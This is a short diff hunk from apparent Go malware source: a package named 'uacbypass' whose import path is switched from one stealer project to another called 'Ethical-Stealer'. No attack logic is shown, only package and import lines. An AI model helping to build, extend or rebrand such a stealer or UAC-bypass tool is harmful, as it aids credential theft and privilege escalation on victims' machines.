@@ -1,7 +1,7 @@
 package uacbypass
 
 import (
-	"github.com/hackirby/skuld/utils/program"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/program"
 	"os"
 	"os/exec"
 	"syscall"
